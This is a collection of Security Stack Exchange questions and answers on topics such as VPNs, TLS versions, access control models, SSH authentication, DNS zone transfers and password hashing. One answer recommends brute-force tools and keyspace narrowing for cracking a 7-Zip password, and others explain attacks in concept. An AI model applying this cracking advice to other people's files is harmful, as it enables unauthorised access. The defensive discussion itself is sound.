<p><code>traceroute</code> reveals IP addresses of routers involved in routing packets. IP addresses are not meant to be secret and are rather easy to obtain for attackers through various means (mass scanning comes to mind, but also searching garbage bags for printouts of network maps -- the modern fashion of recycling makes dumpster diving a much easier and cleaner activity than what it used to be). However, a relatively widespread myth is that keeping your addresses secret somehow ensures security. Correspondingly, many sysadmins consider <code>traceroute</code> as a serious breach, to be fixed and blocked as soon as possible. In practice, though, this is all baloney. If revealing a few internal IP addresses is a major issue, then this means that your network is doomed.</p>

<p>Worrying about secrecy of IP addresses is like triggering a major incident response plan because an outsider learned the menu at the company's cafeteria. It is disproportionate. Granted, having precise and extensive knowledge of the network infrastructure can only help attackers; but not in really significant amounts. Keeping IP addresses secret is not worth breaking connectivity through excessive filtering (for instance, blocking the ""fragmentation required"" ICMP is deadly for any client behind an ADSL+PPPoE link).</p>
","39183"
"Are there any reasons for using SSL over IPSec?","44115","","<p>is it recommended  to use both protocols together? In which situation?</p>
","<p>There are different layers of secure transport to consider here:</p>

<ul>
<li>VPNs
<ul>
<li>SSL VPN (including tunnels)</li>
<li>IPSec VPN</li>
</ul></li>
<li>SSL/TLS for individual services</li>
</ul>

<h1>IPSec vs SSL VPNs</h1>

<p>Both SSL and IPSec VPNs are good options, both with considerable security pedigree, although they may suit different applications.</p>

<p>IPsec VPNs operate at layer 3 (network), and in a typical deployment give full access to the local network (although access can be locked down via firewalls and some VPN servers support ACLs). This solution is therefore better suited to situations where you want remote clients to behave as if they were locally attached to the network, and is particularly good for site-to-site VPNs. IPSec VPNs also tend to require specific software supplied by the vendor, which is harder to maintain on end-user devices, and restricts usage of the VPN to managed devices.</p>

<p>SSL VPNs are often cited as being the preferred choice for remote access. They operate on layers 5 and 6, and in a typical deployment grant access to specific services based on the user's role, the most convenient of which are browser-based applications. It is usually easier to configure an SSL VPN with more granular control over access permissions, which can provide a more secure environment for remote access in some cases. Furthermore, SSL/TLS is inherently supported by modern devices, and can usually be deployed without the need for specialist client-side software, or with lightweight browser-based clients otherwise. These lightweight clients can often also run local checks to ensure that connecting machines meet certain requirements before they are granted access - a feature that would be much harder to achieve with IPSec.</p>

<p>In both cases one can be configured to achieve similar things as the other - SSL VPNs can be used to simply create a tunnel with full network access, and IPSec VPNs can be locked-down to specific services - however it is widely agreed that they are better suited to the above scenarios.</p>

<p>However, for exactly these reasons, many organisations will use a combination of both; often an IPSec VPN for site-to-site connections and SSL for remote access.</p>

<p>There are a number of references on the subject of SSL vs IPSec (some of these are directly from vendors):</p>

<ul>
<li><a href=""https://supportforums.cisco.com/document/113896/quick-overview-ipsec-and-ssl-vpn-technologies"">https://supportforums.cisco.com/document/113896/quick-overview-ipsec-and-ssl-vpn-technologies</a></li>
<li><a href=""http://netsecurity.about.com/cs/generalsecurity/a/aa111703.htm"">http://netsecurity.about.com/cs/generalsecurity/a/aa111703.htm</a></li>
<li><a href=""http://www.sonicwall.com/downloads/EB_Why_Switch_from_IPSec_to_SSL_VPN.pdf"">http://www.sonicwall.com/downloads/EB_Why_Switch_from_IPSec_to_SSL_VPN.pdf</a></li>
<li><a href=""http://searchsecurity.techtarget.com/feature/Tunnel-vision-Choosing-a-VPN-SSL-VPN-vs-IPSec-VPN"">http://searchsecurity.techtarget.com/feature/Tunnel-vision-Choosing-a-VPN-SSL-VPN-vs-IPSec-VPN</a></li>
<li><a href=""http://www.networkworld.com/article/2287584/lan-wan/ipsec-vs--ssl-vpns.html"">http://www.networkworld.com/article/2287584/lan-wan/ipsec-vs--ssl-vpns.html</a></li>
</ul>

<h1>End-to-End Encryption</h1>

<p>In some of the above cases, such as IPSec VPNs and SSL VPN tunnels, you may not be getting end-to-end encryption with the actual service you're using. This is where using an additional layer of SSL/TLS comes in handy.</p>

<p>Say you're remote and trying to connect to an internally hosted web application via an IPSec VPN. If you use the HTTP protocol via your browser, your traffic is encrypted whilst it is running through the VPN tunnel itself, but it is then decrypted when it hits the remote VPN endpoint, and travels over the internal network in cleartext. This might be acceptable in some use cases, but in the interest of defence in depth, we ideally want to know that our data cannot be intercepted anywhere between you and the actual service itself. By connecting to this application over HTTPS, you effectively have two layers of security: one between you and the VPN endpoint, and another travelling through that (between you and the web server itself).</p>

<p>Of course, this is not limited to HTTPS - you should equally employ other secure protocols like SSH, FTPS, SMTP with STARTTLS etc etc.</p>
","63374"
"Somebody hacked my router and changed my wifi SSID","43963","","<p>One of my neighbours hacked the password of my router and he uses my <strong>limited</strong> internet package. I change the wifi SSID almost daily, but he can hack it easily. 
Today, he changed the SSID to a hate speech ""insult"". </p>

<p>How can I stop him? I need a quick and powerful solution. Is there any easy-to-use software that protects my wifi?</p>

<p>I have an idea but I don't know how to do it. Sometimes my mobile (smart phone) finds a wifi network that does <strong>not</strong> have a password. So, I can connect to it easily. When I access the internet, all websites are unavailable. And I can <strong>not</strong> surf any webpage. How to do something like that?</p>

<p><strong>Edit:</strong> I'm Using WPA/WPA2 PSK</p>
","<p>There are two different passwords that access different functions.  If an attacker has the admin password, then he / she can change the SSID, WiFi password, and any other settings on the WiFi router.</p>

<p>To fix:  ensure your WiFi security setting is WPA or WPA2.  Then change the WiFi password to a long one (at least 12 characters, more is better) with special characters and numbers (such as #, $ %, !, 1, 6, see for example <a href=""https://security.stackexchange.com/questions/42134/is-there-any-point-in-using-strong-passwords"">Is there any point in using &#39;strong&#39; passwords?</a>).  <strong><em>Also, make sure the admin password on the WiFi router is changed from the factory default.  This admin password is different than the WiFi password.</em></strong>  It should also be a long complicated password, but do NOT make it the same as the WiFi password.  The WiFi password is the one you give to friends and family to access your WiFi.  The admin password should be kept with you only, or people you REALLY trust, as it can be used to change WiFi settings.  Once this is done, change the SSID back to one you like.</p>

<p>Also, make sure to disable the feature called Wi-Fi Protected Setup (WPS).  See <a href=""http://www.howtogeek.com/176124/wi-fi-protected-setup-wps-is-insecure-heres-why-you-should-disable-it/"">http://www.howtogeek.com/176124/wi-fi-protected-setup-wps-is-insecure-heres-why-you-should-disable-it/</a> for details on why WPS is not recommended.</p>

<p>If the attacker is still able to change the SSID and any passwords, your system is more deeply compromised and I would recommend contacting a computer expert or store who can help you clean your system.  They can also give you advice on if there is anything local law enforcement can do, as your attacker is likely committing a crime.</p>
","107760"
"Is there any technical security reason not to buy the cheapest SSL certificate you can find?","43958","","<p>While shopping for a basic SSL cert for my blog, I found that many of the more well-known Certificate Authorities have an entry-level certificate (with less stringent validation of the purchaser's identity) for approximately $120 and up. But then I found that Network Solutions offers one of these lower-end certs for $29.99 (12 hours ago it was $12.95) with a 4-year contract.</p>

<p>Is there any technical security reason that I should be aware of that could make me regret buying the lowest-end certificate? They all promise things like 99% browser recognition, etc. I'm not asking this question on SE for comparison of things like the CA's quality of support (or lack thereof) or anything like that. I want to know if there is any cryptographic or PKI reason so avoid a cert which costs so little. It, like others, says that it offers ""up to 256 bit encryption"".</p>
","<p>For the purposes of this discussion there are only a couple differences between web signing certificates:</p>

<ol>
<li>Extended vs standard validation (green bar). </li>
<li>Number of bits in a certificate request (1024/2048/4096). </li>
<li>Certificate chain. </li>
</ol>

<p>It is easier to set up certificates with a shorter trust chain but there are inexpensive certs out there with a direct or only one level deep chain. You can also get the larger 2048 and 4096 bit certs inexpensively. </p>

<p>As long as you don't need the extended validation there is really no reason to go with the more expensive certificates. </p>

<p>There is one specific benefit that going with a larger vendor provides - the more mainline the vendor, the less likely they are to have their trust revoked in the event of a breach.<br>
For example, <a href=""http://en.wikipedia.org/wiki/DigiNotar"">DigiNotar</a> is a smaller vendor that was unfortunate enough to have their trust revoked in September 2011.</p>
","18670"
"What is the difference between RBAC and DAC/ACL?","43957","","<p>What are the benefits of each, and when should I choose one over the other? Are there situations where these should be merged? </p>

<p>Do you have examples of common usages?  </p>

<p>And what about MAC, where does that fit in?</p>
","<p>RBAC (Role based access control) is based on defining a list of business roles, and adding each user in the system to one or more roles. Permissions and privileges are then granted to each role, and users receive them via their membership in the role (pretty much equivalent to a group). Applications will typically test the user for membership in a specific role, and grant or deny access based on that.<br>
Discretionary Access Control (DAC) allows a user or administrator to define an Access Control List (ACL) on a specific resource (e.g. file, registry key, database table, OS object, etc), this List will contain entries (ACE) that define each user that has access to the resource, and what her privileges are for that resouce.   </p>

<p>The main benefit of RBAC over DAC, is ease of management - in principle you have a very few roles, centrally administered, no matter how many users, and its just a question of granting each user the correct role; as opposed to DAC, where for each new user (or change in user, or deletion, etc), you have to go around to all the resources she needs access to and add them to the list.<br>
On the other hand, DAC is often simpler, and generally more granular. Also, in the DAC model the data owner can decide who has access (if he has that permission on the data) and add or remove people from the list.  </p>

<p>Very common example of DAC is the Windows file system. On the other hand, very common example of RBAC is the DAC on corporate file servers - anyone in the ""Sales"" ActiveDirectory group will have access to the \Sales\ shared folder.  More commonly is the Administrators group in Windows.  </p>

<p>MAC is Mandatory Access Control, this can be seen as a classification or privacy level. This is most often used in military systems, and back in the Mainframe days :). Not so much used anymore, though current OS's are implementing a flavor of this, such as Vista/Win7's Integrity Levels.  </p>

<p>To sum up the differences:  </p>

<ul>
<li>DAC is based on personal permissions, RBAC on ""group""-level permissions </li>
<li>DAC is set by the data owner, RBAC by the system owner/s (usually the developer defines the access given to each role, and the operational admin puts users into roles) </li>
<li>DAC definitions are typically attached to the data/resource, whereas RBAC is usually defined in two places: in code/configuration/metadata (the roles access), and on the user object (or table - the roles each user has).  </li>
<li>On the other hand, RBAC roles are centrally administered (who is associated with which roles), whereas DAC is administered ""on the resource"" (i.e. you administer each resource individually).</li>
<li>The definition of permissions per role is typically static in RBAC, and users are only granted roles; in DAC the permissions per resource are often changed at runtime.</li>
<li>DAC should be seen as enumerating ""who has access to my data"", and RBAC defines ""what can this user do"".</li>
</ul>
","348"
"Is HTML5 vibrate feature a security vulnerability?","43839","","<p>While surfing a news website on my mobile, I receive a virus infection alert warning that triggers my phone to vibrate incessantly. The alert looks like the following:</p>

<p><a href=""https://i.stack.imgur.com/B9txo.jpg"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/B9txo.jpg"" alt=""scareware""></a></p>

<p>I didn't expect my phone to vibrate and the alert is able to tell me the model of my phone (first panel) and the OS system (second panel). Clicking the back button causes another warning to pop-up (third panel). </p>

<p>I almost wanted to follow the instructions on the second panel to install what looks like an anti-virus. But luckily, I was able to calm my nerves sufficiently to realize that this is a scare-ware served through an ad-server and that the anti-virus could be the actual virus.</p>

<p>Given that the HTML5 vibrate function is a new feature that people hardly encounter on websites. It would not be a surprise that there are people falling prey to this tactic.</p>

<p>Is HTML5 vibration feature a security vulnerability? Should mobile browsers enable such a feature on websites by default?</p>
","<p>A popup was used to show the alert. Does this mean that the popup feature introduces vulnerabilities? Then by that line of reasoning JavaScript is the source of all problems. There are people who actually think that JS is an important vector for attacks and block it on untrusted websites with extensions like NoScript. </p>

<p>Many features can be misused, and is up to people creating the standards, browsers and even websites to judge what is bad and to change the standards or implement mitigations. Of course those people can be wrong and some feature can be unexpectedly used to attack users.</p>

<p>A nice example is the browser's console which is very often used to trick users into pasting JS code that attacks the user. This helped Facebook worms to propagate with great success. Facebook noticed this and introduced this message in the console:
<a href=""https://i.stack.imgur.com/D8mk8.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/D8mk8.png"" alt=""enter image description here""></a></p>

<p>This vibrate function might trick some users into thinking that it is actually the OS showing the alert, but I think the latest mobile browsers do a good job of showing the user that he is still inside the browser. In this case, the message from the browser is clear enough ""The page at andro-apps.com says:""</p>

<p>If this becomes an important vector for attack, I'm sure the browser manufacturers will notice that and will make changes to reduce the impact.</p>
","95705"
"What are the differences between the versions of TLS?","43786","","<p>Please correct me if I'm wrong, but my understanding is that SSLv3 and TLSv1 is just a rename of the earlier protocol... but TLSv1 adds the ability to have secured and unsecured traffic on the same port.</p>

<p>What are the differences and benefits of all the newer specs of TLS?</p>
","<p>I like this blog entry by <a href=""http://www.yassl.com/yaSSL/Home.html"">yaSSL</a> describing the differences:  <a href=""http://www.yassl.com/yaSSL/Blog/Entries/2010/10/7_Differences_between_SSL_and_TLS_Protocol_Versions.html"">http://www.yassl.com/yaSSL/Blog/Entries/2010/10/7_Differences_between_SSL_and_TLS_Protocol_Versions.html</a></p>

<p>I copied the key snippets from the blog to here:</p>

<blockquote>
  <p>""<strong>SSL 3.0</strong>
  [..] Some major improvements of SSL 3.0 over SSL 2.0 are:</p>
  
  <ul>
  <li>Separation of the transport of data from the message layer</li>
  <li>Use of a full 128 bits of keying material even when using the Export cipher</li>
  <li>Ability of the client and server to send chains of certificates, thus allowing organizations to use certificate hierarchy which is more than two certificates deep.</li>
  <li>Implementing a generalized key exchange protocol, allowing Diffie-Hellman and Fortezza key exchanges as well as non-RSA certificates.</li>
  <li>Allowing for record compression and decompression</li>
  <li>Ability to fall back to SSL 2.0 when a 2.0 client is encountered</li>
  </ul>
  
  <p><strong>TLS 1.0</strong>
  [..] This was an upgrade from SSL 3.0 and the differences were not dramatic, but they are significant enough that SSL 3.0 and TLS 1.0 don't interoperate.  Some of the major differences between SSL 3.0 and TLS 1.0 are:</p>
  
  <ul>
  <li>Key derivation functions are different</li>
  <li>MACs are different - SSL 3.0 uses a modification of an early HMAC while
  TLS 1.0 uses HMAC.</li>
  <li>The Finished messages are different</li>
  <li>TLS has more alerts</li>
  <li>TLS requires DSS/DH support</li>
  </ul>
  
  <p><strong>TLS 1.1</strong>
  [..] is an update to TLS 1.0.  The major changes are:</p>
  
  <ul>
  <li>The Implicit Initialization Vector (IV) is replaced with an explicit IV to protect against Cipher block chaining (CBC) attacks.</li>
  <li>Handling of padded errors is changed to use the bad_record_mac alert rather than the decryption_failed alert to protect against CBC attacks.</li>
  <li>IANA registries are defined for protocol parameters</li>
  <li>Premature closes no longer cause a session to be non-resumable.</li>
  </ul>
  
  <p><strong>TLS 1.2</strong>
  [..] Based on TLS 1.1, TLS 1.2 contains improved flexibility. The major differences include:</p>
  
  <ul>
  <li>The MD5/SHA-1 combination in the pseudorandom function (PRF) was
  replaced with cipher-suite-specified
  PRFs.</li>
  <li>The MD5/SHA-1 combination in the digitally-signed element was replaced
  with a single hash.  Signed elements
  include a field explicitly specifying
  the hash algorithm used.</li>
  <li>There was substantial cleanup to the client's and server's ability to
  specify which hash and signature
  algorithms they will accept.</li>
  <li>Addition of support for authenticated encryption with
  additional data modes.</li>
  <li>TLS Extensions definition and AES Cipher Suites were merged in.</li>
  <li>Tighter checking of EncryptedPreMasterSecret version
  numbers.</li>
  <li>Many of the requirements were tightened</li>
  <li>Verify_data length depends on the cipher suite</li>
  <li>Description of Bleichenbacher/Dlima attack defenses cleaned up.</li>
  </ul>
</blockquote>
","712"
"Are there security issues with embedding an HTTPS iframe on an HTTP page?","43726","","<p>I've seen <a href=""http://feedingamerica.org/faces-of-hunger.aspx"">websites</a> placing HTTPS iframes on HTTP pages.</p>

<p>Are there any security concerns with this? Is it secure to transmit private information like credit card details in such a scheme (where the information is only placed on the HTTPS iframe form, and not on the HTTP parent page)?</p>
","<p>If only the iframe is https, the user cannot trivially see the URL it points to.  Therefore, the source http page could be altered to point the iframe anywhere it wanted to. That's pretty much a game-over vulnerability that eliminates the advantages of https.</p>
","895"
"How to scan a PDF for malware?","43719","","<p>Can anyone suggest an automated tool to scan a PDF file to determine whether it might contain malware or other ""bad stuff""?  Or, alternatively, assigns a risk level to the PDF?</p>

<p>I would prefer a free tool.  It must be suitable for programmatic use, e.g., from the Unix command line, so that it is possible to scan PDFs automatically and take action based upon that.  A web-based solution might also be OK if it is scriptable.</p>
","<p>You can always upload your PDF to wepawet :)</p>

<p><a href=""http://wepawet.cs.ucsb.edu/"">http://wepawet.cs.ucsb.edu/</a></p>
","3009"
"ssltest: Chain issues - Contains anchor","43540","","<p>I've run <a href=""https://www.ssllabs.com/ssltest/analyze.html?d=sophia.org"">ssltest</a> on web application and it found ""Chain issues - Contains anchor"" (section ""Additional Certificates (if supplied)"")</p>

<p>What does it mean? Should it be fixed? Can it be exploited?</p>
","<p>When the server sends its certificate to the client, it actually sends a <em>certificate chain</em> so that the client finds it easier to validate the server certificate (the client is not <em>required</em> to use exactly that chain, but, in practice, most client will use the chain and none other). This is described in the <a href=""http://tools.ietf.org/html/rfc5246"">SSL/TLS standard</a>, section 7.4.2, with, in particular, this enlightening excerpt:</p>

<blockquote>
  <p>The sender's
        certificate MUST come first in the list.  Each following
        certificate MUST directly certify the one preceding it.  Because
        certificate validation requires that root keys be distributed
        independently, the self-signed certificate that specifies the root
        certificate authority MAY be omitted from the chain, under the
        assumption that the remote end must already possess it in order to
        validate it in any case.</p>
</blockquote>

<p>Since that's a ""MAY"" case (the ""MAY"", ""MUST"", ""SHOULD""... terminology in RFC has very precise meanings explained in <a href=""http://tools.ietf.org/html/rfc2119"">RFC 2119</a>), the server is allowed to include the root certificate (aka ""trust anchor"") in the chain, or omit it. Some servers include it, others do not. A typical client implementation, intent on using exactly the chain which was sent, will first try to find the chain certificates in its trust store; failing that, it will try to find an <em>issuer</em> for the ""last"" chain certificate in its trust store. So, either way, this is standards compliant, and it should work.</p>

<p>(There is a minor source of confusion with regards to chain order. In true <a href=""http://tools.ietf.org/html/rfc5280"">X.509</a>, the chain is ordered from trust anchor to end-entity certificate. The SSL/TLS ""Certificate"" message is encoded in reverse order, the end-entity certificate, which qualifies the server itself, coming first. Here, I am using ""last"" in SSL/TLS terminology, not X.509.)</p>

<p>The only bad thing that can be told about sending the root in the chain is that it uses a bit of network bandwidth needlessly. That's about 1 kB data per connection <em>which includes a full handshake</em>. In a typical session between a client (Web browser) and a server, only one connection will be of that type; the other connections from the client will use ""abbreviated handshakes"" which build on the initial handshake, and do not use certificates at all. And each connection will be kept alive for many successive HTTP requests. So the network overhead implied by the root-sending is slight.</p>
","24566"
"How does ssh public key authentication work?","43457","","<p>My basic understanding is this:</p>

<ul>
<li>The (connected to) server's <code>sshd</code> uses the public key to encrypt some message</li>
<li>The client's <code>ssh</code> or <code>ssh-agent</code> decrypts it and sends something back (the message's checksum? its signature?)</li>
<li>The server's <code>sshd</code> verifies that this is consistent with the message to authenticate the user</li>
</ul>

<p>But what are the details? What is the ""some message"", what does <code>ssh(-agent)</code> send back? Would doing this with the same original message over and over again always yield the same communication?</p>

<p>Can this authentication process be replayed via bash tools if <code>ssh-agent</code> is used? E.g. the public keys that <code>ssh-agent</code> provides can be obtained via <code>ssh-add -L</code>, what about the rest of the process? Or would that require manually connecting to the <code>$SSH_AUTH_SOCK</code> unix socket and some low-level communication?</p>

<hr>

<p>Related: <a href=""https://security.stackexchange.com/a/9389/3272"">Thomas' Server-Bob dialogue here</a>, though that suggests the client just signs some random data that will then be checked against all public keys of the server user's <code>authenticated_keys</code>.  <a href=""http://www.unixwiz.net/techtips/ssh-agent-forwarding.html#chal"" rel=""noreferrer"">This illustration</a> on the other hand claims the message is encrypted to the previously determined user's public key (not the one for the ssh encryption) and the client outputs the checksum which also depends on some random session ID. Which one is correct? Or do both only tell part of the actually more complex story?</p>
","<p>The particulars of the authentication depend on the protocol version and the type of key. In all cases, there is always a challenge, with some randomness to avoid replay attacks. When the user key is of type DSA, a true digital signature is necessarily involved, since DSA is a signature-only algorithm. The article you link to shows something which assumes that the user key can do asymmetric encryption; I guess this is something that SSHv1 did (in SSHv1, all keys were RSA, and RSA can do asymmetric encryption). For the current (SSHv2) protocol, public-key based client authentication is specified in <a href=""http://tools.ietf.org/html/rfc4252"">RFC 4252</a>, section 7.</p>

<p>The core concept remains the same: the client proves its control of the private key by performing an operation which requires knowledge of that key, but such that the ""inverse"" operation can be done with the public key which is located in the <code>.ssh/authorized_keys</code> on the server.</p>
","23242"
"Why would you not permit Q or Z in passwords?","43430","","<p><a href=""http://help.jetblue.com/SRVS/CGI-BIN/webisapi.dll?New,Kb=askBlue,case=obj%28403864%29#s3"">Jetblue's password requirements</a> specify that, among other stringent requirements:</p>

<blockquote>
  <p>Cannot contain a Q or Z</p>
</blockquote>

<p>I can't fathom a logical reason for this, unless it were say, extremely common for the left side of keyboards to break, but then you wouldn't allow 'A' either :)</p>

<p>What would be the reason for this security requirement?</p>
","<p>It's a leftover from the time <a href=""http://kottke.org/12/06/the-worlds-worst-password-requirements-list"">when keypads didn't have the letters Q and Z</a>. Security-wise, there's no reason. It's just because of old systems.</p>

<p>To clarify:</p>

<p>You used to be able to enter your password over the phone. Some phones didn't have the letters Q or Z, like the one on the picture below.</p>

<blockquote>
  <p><img src=""https://i.stack.imgur.com/k6dX5.jpg"" alt=""enter image description here"" title=""Image from from Bill Bradford on flickr.com""><br/>
  <sub>Image courtesy: <a href=""https://www.flickr.com/photos/mrbill/148973327/in/set-72057594138809478"">Bill Bradford on flickr.com</a></sub></p>
</blockquote>

<p>Because of this, passwords including these characters were disallowed. They haven't changed this requirement for whatever reason: Legacy systems, poor documentation, or they just don't care. </p>
","57910"
"Stopping DDOS TCP SYN and UDP flood attacks","43403","","<p>I would like to know if it's possible to stop a TCP SYN OR ICMP Flood attacks if these attacks are detected at time. What is the most accurate process to filter these addresses if the only way is to block the IP addresses of the botnet.</p>
","<p>Chances are these attacks will be done using IP spoofing, the first line of defence is encouraging your ISP to adopt <a href=""ftp://ftp.ripe.net/ripe/docs/ripe-432.pdf"" rel=""nofollow"">BCP38</a> to avoid IP spoofing. </p>

<p>The problem with a Denial of Service attack is that often you need to prevent the malicious traffic from reaching you in the first place. You can not do a lot locally, but you can always opt in for a service like CloudFare (who also implement BCP38) as they can scrub these kind of packets before they reach you. </p>
","34302"
"How serious is InstallIQ?","43320","","<p><strong>Background:</strong></p>

<p>Recently I've seen hits for InstallIQ a ""potentially unwanted application"" from ESET.  From what I can find it seems like this is an installer wrapper that asks people to install other benign software.  It seems a lot of free software is using this to make some money from referrals.  </p>

<p><strong>Questions:</strong></p>

<p>Is there anything malicious InstallIQ does that I have missed?</p>

<p>Will there come a point that this becomes so ubiquitous that ESET stops flagging it as Adware?</p>
","<blockquote>
  <p>Is there anything malicious InstallIQ does that I have missed?</p>
</blockquote>

<p>From what I can gather, <a href=""http://www.w3i.com/installiq.aspx"">InstallIQ</a> in and of itself does not actually install anything malicious - however, it does provide mechanisms for third parties to bundle additional ""offers"" with products at install-time, which is a very attractive proposition for malware/spyware authors.</p>

<blockquote>
  <p>Will there come a point that this becomes so ubiquitous that ESET stops flagging it as Adware?</p>
</blockquote>

<p>I understand your concern, but I'm going to say no. There are many competing installer packages available in the market and many are considered more reputable. For example, <a href=""https://secure.wikimedia.org/wikipedia/en/wiki/Windows_Installer"">MSI</a> is Microsoft's preferred solution and integrates best with the likes of WSUS. Aside from MSI, other popular windows installers include <a href=""http://nsis.sourceforge.net/Main_Page"">NSIS</a> (which I believe Mozilla use) or <a href=""http://www.flexerasoftware.com/products/installshield.htm"">InstallShield</a>. So InstallIQ has an uphill battle to become ubiquitous.</p>

<p>Secondly, there's a reputation issue. Personally, I would not distribute my software with any kind of add-on bundling solution, especially one which has links with malware distribution, however tenuous, if an alternative existed. Distributing nagware or malware to your customers will do nothing for your goodwill and continuing business. In this sense, such a solution is actually a security threat to you business model.</p>

<p>Finally, antivirus and antispyware producers are not going to ignore malware distribution in installers - even innocent installers could potentially be corrupted or be tampered with. Not catching viruses, nagware and spyware is not a good business model to use as an antivirus company.</p>

<p>So in conclusion, I think there are enough good reasons and sufficient pressure that such solutions are unlikely to become either ubiquitous or ignored, although they will continue to be used on a small scale both legitimately and to distribute malware. </p>
","8701"
"Forgot password to 7-Zip archive","43134","","<p>I think I already know the answer to this question, but I thought I'd ask the experts anyway.</p>

<p>A few months back, I created a password-protected 7-Zip archive which housed the source code of a simple program I was writing at the time. I was using the archive everyday, and so never wrote the password down. I've been racking my brain since finding the archive on my hard drive earlier in the week trying to remember the password, but I'm sure it's long forgotten.</p>

<p>I was wondering if there is any way to brute-force this password, or if it is even possible?</p>

<p>The password is at probably 4-13 chars long, and more than likely alpha-numeric with symbols too. It doesn't contain essential files, but I'd like to recover the code if at all possible.</p>
","<p>If it's a 4 character password, you can do it.  If it's 13, good luck.</p>

<p><a href=""http://rarcrack.sourceforge.net/"" rel=""noreferrer"">Rarcrack</a>, under the GPLv2 license, is one of the few cracking packages that has a mode for 7z files at this time.</p>

<ul>
<li><p>A tip from <a href=""http://www.mydigitallife.info/how-to-recover-rar-7z-and-zip-password-with-rarcrack-in-linux/"" rel=""noreferrer"">MyDigitalLife.info</a> shows that if you start rarcrack once, then stop it, you can edit the abc element of its XML config/status file to limit the character set it searches.</p></li>
<li><p>If there are any characters you can eliminate, do so; it'll shrink the keyspace significantly.</p></li>
</ul>

<p>If you're reading this thread after March 2014, see if there's a version of <a href=""http://openwall.info/wiki/john/sample-non-hashes"" rel=""noreferrer"">John the Ripper</a> that lists 7z files; as of today, there is not, it's merely listed for the future (indeterminate).</p>

<p>Edited 2016: <a href=""http://hashcat.net/oclhashcat/#features-algos"" rel=""noreferrer"">oclHashcat</a> now supports 7-zip format as well, and is definitely a superior product.</p>
","51908"
"DNS zone transfer attack","43018","","<p>Can anyone explain what is DNS zone transfer attack or give any link, paper?</p>

<p>I have already googled, but could not find anything meaningful.</p>
","<p>DNS Zone transfer is the process where a DNS server passes a copy of part of it's database (which is called a ""zone"") to another DNS server. It's how you can have more than one DNS server able to answer queries about a particular zone; there is a Master DNS server, and one or more Slave DNS servers, and the slaves ask the master for a copy of the records for that zone. </p>

<p>A basic DNS Zone Transfer Attack isn't very fancy: you just pretend you are a slave and ask the master for a copy of the zone records. And it sends you them; DNS is one of those really old-school Internet protocols that was designed when everyone on the Internet <a href=""http://blog.ted.com/what-the-internet-looked-like-in-1982-a-closer-look-at-danny-hillis-vintage-directory-of-users/"">literally knew everyone else's name and address</a>, and so servers trusted each other implicitly.</p>

<p>It's worth stopping zone transfer attacks, as a copy of your DNS zone may reveal a lot of topological information about your internal network. In particular, if someone plans to subvert your DNS, by poisoning or spoofing it, for example, they'll find having a copy of the real data very useful.</p>

<p>So best practice is to restrict Zone transfers. At the bare minimum, you tell the master what the IP addresses of the slaves are and not to transfer to anyone else. In more sophisticated set-ups, you sign the transfers. So the more sophisticated zone transfer attacks try and get round these controls.</p>

<p>SANS have <a href=""http://www.sans.org/reading_room/whitepapers/dns/securing-dns-zone-transfer_868"">a white paper</a> that discusses this further.</p>
","10457"
"Why shouldn't we roll our own?","42963","","<p>Why shouldn't we create our own security schemes?</p>

<p>I see a lot of questions around here about custom crypto and custom security mechanisms, especially around password hashing.</p>

<p>With that in mind, I'm looking for a canonical answer, with the following properties:</p>

<ul>
<li>Easy for a newbie to understand.</li>
<li>Clear and explicit in <em>why</em> rolling your own is a bad idea.</li>
<li>Provides strong examples.</li>
</ul>

<p><a href=""http://xkcd.com/153/"">Obligatory xkcd.</a></p>
","<p>You can roll your own, but you probably will make a major security mistake if you are not an expert in security/cryptography or have had your scheme analyzed by multiple experts.  I'm more willing to bet on an open-source publicly known encryption scheme that's out there for all to see and analyze.  More eyes means more likely that the current version doesn't have major vulnerabilities, as opposed to something developed in-house by non-experts.</p>

<p>From Phil Zimmermann's (PGP creator) <a href=""ftp://ftp.pgpi.org/pub/pgp/7.0/docs/english/IntroToCrypto.pdf"" rel=""noreferrer"">Introduction to Cryptography (Page 54)</a>:</p>

<blockquote>
  <p>When I was in college in the early 70s, I devised what I believed was a brilliant
  encryption scheme. A simple pseudorandom number stream was added to the
  plaintext stream to create ciphertext. This would seemingly thwart any
  frequency analysis of the ciphertext, and would be uncrackable even to the
  most resourceful government intelligence agencies. I felt so smug about my
  achievement.</p>
  
  <p>Years later, I discovered this same scheme in several introductory
  cryptography texts and tutorial papers. How nice. Other cryptographers had
  thought of the same scheme. Unfortunately, the scheme was presented as a
  simple homework assignment on how to use elementary cryptanalytic
  techniques to trivially crack it. So much for my brilliant scheme.</p>
  
  <p>From this humbling experience I learned how easy it is to fall into a false sense
  of security when devising an encryption algorithm. Most people don’t realize
  how fiendishly difficult it is to devise an encryption algorithm that can
  withstand a prolonged and determined attack by a resourceful opponent.</p>
</blockquote>

<p>(This <a href=""https://security.stackexchange.com/questions/6740/flaw-in-encryption-through-pseudorandom-number-stream-from-gpg-documentation"">question</a> has more discussion of the above quote.)</p>

<p>If you are not convinced of ""Don't Roll Your Own [Cryptography/Security]"", then you probably are not an expert and there are many mistakes you likely will make.   </p>

<p>Is your application robust against:</p>

<ul>
<li><p><a href=""http://en.wikipedia.org/wiki/Timing_attack"" rel=""noreferrer"">Timing Attacks</a>.  E.g., to the nanoseconds do completely-bad keys and partially-bad keys take the same amount of time in the aggregate to fail?  Otherwise, this timing information can be exploited to find the correct key/password.    </p></li>
<li><p><a href=""https://security.stackexchange.com/questions/17664/how-can-i-find-what-hashing-algorithm-was-used/17671#17671"">Trivial Brute Force Attacks</a>; e.g., that can be done in within seconds to years (when you worry about it being broken within a few years).  Maybe your idea of security may be a 1 in a billion (1 000 000 000) chance of breaking in (what if someone with a bot net tries a few billion times?).  My idea is to aim for something like 1 in ~2^128 ( 34 000 000 000 000 000 000 000 000 000 000 000), which is roughly ten million billion billion times more secure and completely outside the realm of guessing your way in.  </p></li>
<li><p>Attacks on user accounts in parallel; e.g., you may hash passwords with the same (or worse no) 'salt' on all password hashes in the database like what happened with the  leaked <a href=""http://www.zdnet.com/blog/btl/linkedin-password-breach-how-to-tell-if-youre-affected/79412"" rel=""noreferrer"">linkedin</a> hashes.</p></li>
<li><p>Attack any specific account trivially simply.  Maybe there was a unique random salt with each simply hashed (e.g., MD5/SHA1/SHA2) password, but as you can try billions of possible passwords on any hash each second, so using common password lists, dictionary attacks, etc. it may only take an attacker seconds to crack most accounts.  Use strong cryptographic hashes like bcrypt/PBKDF2 to avoid or key-strengthen regular hashes by a suitable factor (typically 10^(3-8).</p></li>
